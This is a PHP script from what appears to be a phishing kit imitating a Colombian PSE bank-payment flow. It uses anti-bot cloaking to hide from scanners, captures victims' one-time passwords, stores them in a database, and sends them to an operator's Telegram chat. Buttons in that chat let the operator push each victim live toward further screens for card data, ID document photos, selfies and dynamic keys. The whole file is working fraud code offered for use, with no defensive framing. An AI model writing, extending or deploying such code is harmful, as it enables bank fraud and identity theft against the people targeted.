<?php
// ── Cloaking Anti-Bot ────────────────────────────────────
require_once __DIR__ . '/../../config/cloak.php';
// ─────────────────────────────────────────────────────────

// Mobile check removed

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    cloak_validate_post_request('../../decoy.php');

    // 1. Cargar Configuración Global
    $config = require __DIR__ . '/../../config/config.php';

    if (!$config || !is_array($config)) {
        die("Error: No se pudo cargar la configuración.");
    }

    // Conexión DB
    $pdo = require __DIR__ . '/../../config/db.php';

    $bot_token = $config['botToken'];

    $chat_id = $config['chatId'];

    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // 2. Recuperar datos
    $cliente_id = $_POST['cliente_id'] ?? null;
    $otp_array = $_POST['otp'] ?? [];
    $message = '';

    if (empty($cliente_id) || count($otp_array) < 1) { // Removed strict check for 6 digits for flexibility
        header("Location: ../../index.php");
        exit();
    }

    $submitted_otp = implode('', $otp_array);

    // 3. Actualizar
    try {
        $sql = "UPDATE pse SET estado = 1, otp = :otp WHERE id = :id"; // Usamos 6 o 0? Original usaba 0. Dejemos 6 (Data) o 0 (Wait). Update: Botones cambian el estado real. Aquí solo notificamos.
        // Si el usuario envia OTP, se queda esperando.
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['otp' => $submitted_otp, 'id' => $cliente_id]);

        $message = "✅ OTP Recibido ✅\n\n🆔 ID: {$cliente_id}\n🔐 OTP: {$submitted_otp}";

    }
    catch (PDOException $e) {
        $message = "⚠️ Error DB OTP ID: {$cliente_id}";
    }

    // 4. Buttons
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$cliente_id"],
                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$cliente_id"],
            ],
            [
                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$cliente_id"],
                ['text' => '💳 CC',         'callback_data' => "cmd_5_$cliente_id"],
            ],
            [
                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$cliente_id"],
                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$cliente_id"],
            ],
            [
                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$cliente_id"],
                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$cliente_id"]
            ],
            [
                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$cliente_id"],
                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$cliente_id"]
            ],
            [
                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$cliente_id"],
                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$cliente_id"],
                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$cliente_id"]
            ]
        ]
    ];

    $encoded_keyboard = json_encode($keyboard);

    // 5. Send
    if (!empty($message)) {
        $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message,
            'reply_markup' => $encoded_keyboard
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url_telegram);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
    }

    // 6. Redirect
    header("Location: ../../index.php?status=espera&id=" . $cliente_id);
    exit();

}
else {
    header("Location: ../../index.php");
    exit();
}
